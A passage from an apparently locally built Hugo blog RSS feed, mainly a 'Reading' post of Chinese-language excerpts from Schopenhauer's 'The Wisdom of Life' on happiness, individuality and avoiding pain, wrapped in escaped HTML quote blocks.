2016)，他们会以有助于维系伴侣关系的方式看待自己、伴侣及双方关系，并且以能够避免或化解冲突、充实亲密关系的方式行事。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
    <item>
      <title>《人生的智慧》</title>
      <link>http://localhost:1313/posts/read_rsdzh/</link>
      <pubDate>Thu, 23 Oct 2025 23:40:32 +0800</pubDate>
      <guid>http://localhost:1313/posts/read_rsdzh/</guid>
      <category domain="http://localhost:1313/categories/reading/">Reading</category>
      <description>&lt;h2 class=&#34;heading-element&#34; id=&#34;摘录&#34;&gt;&lt;span&gt;摘录&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e6%91%98%e5%bd%95&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们不应为某件事情过分高兴或者过分悲伤，原因之一就是一切事物都在改变，另一个原因是我们对于何为有利、何为不利的判断是虚幻的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们幸福的原因存在于我们的自身之内，而不是自身之外&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人的内心快乐抑或内心痛苦首先就是人的感情、意欲和思想的产物。而人自身之外的所有事物，对于人的幸福都只是间接地发挥影响&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们唯一能够做到的就是尽可能充分地利用我们既定的个性。因此，我们应该循着符合我们个性的方向，努力争取适合个性的发展，除此之外则一概避免。所以，我们必须选择与我们个性相配的地位、职业和生活方式&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人的个性及其价值，才唯一直接与他的幸福有关&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;保持身体健康的手段无非就是避免一切纵欲放荡的行为、令人不快和剧烈的情绪动荡，以及长时间紧张的精神劳累；每天至少在户外进行两个小时的身体快速运动；勤洗冷水浴，饮食有节&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个人自身拥有越丰富，他对身外之物的需求也就越少，别人对他来说就越不重要&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;为了外在的荣耀、地位、头衔和名声而部分或全部奉献出自己的内在安宁、闲暇和独立——这是极度的愚蠢行为&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;缺乏痛苦的程度是衡量一个人生活是否幸福的标准&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;认清幸福是避免痛苦，而不是寻求快乐：我们不应该以痛苦为代价去购买快乐，甚至只是冒着遭受痛苦的风险去这样做也不行，否则，我们就会为了那些否定、因而是虚幻的东西而付出了肯定和实在的东西。但如果我们牺牲欢娱以避免痛苦，那我们肯定获得收益&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;降低对幸福的期待：&#xA;我们对于幸福的过分期待毁坏了这世上的一切，毁坏的程度与我们做梦的程度相一致。谁要是摆脱了过分的期待，除了自己已经拥有的以外，不再奢望更多，那么，他就能够安然无恙地生活下去”（《梅克通信录》）&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果你失去一个世界，&#xA;不要为此悲伤，因为这是微不足道的；&#xA;如果得到一个世界，&#xA;不要为此高兴，因为这是微不足道的；&#xA;苦乐得失都会过去&#xA;都会离开这个世界，因为这都是微不足道的。&#xA;——安瓦里：《苏哈里》&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人生智慧的重要一点就是在关注现在和计划将来这两者之间达致恰到好处的平衡，这样，现在与将来才不至于互相干扰&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;不要由于在过去我们的希望落空现在就变得忧郁寡欢，或者为了将来操心伤神以致败坏现时&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;我们应该时刻记住：此刻时光匆匆消逝化作神奇的往昔，从此以后，它就存留在我们的记忆里，照射出不朽之光芒。在将来，尤其到了糟糕恶劣的日子，我们的记忆就会拉起帷幕：此刻时光就会成为我们内心眷恋和思念的对象。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;如果不跟别人作比较，那我们就会为我们所得到的感到快乐；如果由于别人比我们更加幸运而内心不安，那我们将永远不会快乐&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;对于一切涉及痛苦和快乐的事情，我们应该把牢想象力的闸门&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;通常，为了使现时灰暗的生活生色明快，我们盘算着种种美妙的可能，凭空想象出形形色色的诱人的希望，而所有这些都孕育着失望。&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;正如流通的是纸钞，而不是真金白银，同样，在这个世界上，流行的不是发自内心的尊重和真正的友谊，而只是做得尽量逼真和自然地显示尊重和友谊的表面工夫&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;“唯一能够取悦别人的方式就是把自己裹以最傻呆的动物的外皮。”显示自己的聪明智慧其实就是间接地指责别人愚蠢和无能&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一个明智的人其实就是一个不会被事物恒久不变的表面所欺骗的人，他甚至预见到了事情即将往哪一方向变化&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;帮助我们以镇定自若的态度接受发生在我们身上的不幸和灾祸的最佳方法，莫过于确信这一真理：“发生的所有大大小小的事情，都是必然地发生。”&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;所有的事物作为客体，亦即纯粹作为表象而存在时，毫无例外都是令人愉快的；但当这些事物作为主体存在，亦即存在于意欲之中时，却都沉浸在痛苦和悲哀之中&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;一切事物在被观照时都是愉悦的，但在具体存在时，却是可怕的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;那些画像之所以具有如此的魅力，正是因为这些纯粹只是画像而已，它们并不是真实的&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&#xA;&lt;div class=&#34;details admonition quote open&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-quote-right&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;quote&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;      &lt;div class=&#34;admonition-content&#34;&gt;人生经验的首要任务，就是要摆脱那些在我们青春期扎根头脑的幻想和虚假概念&lt;/div&gt;&#xD;&#xA;    &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;</description>
    </item>
  </channel>
</rss>
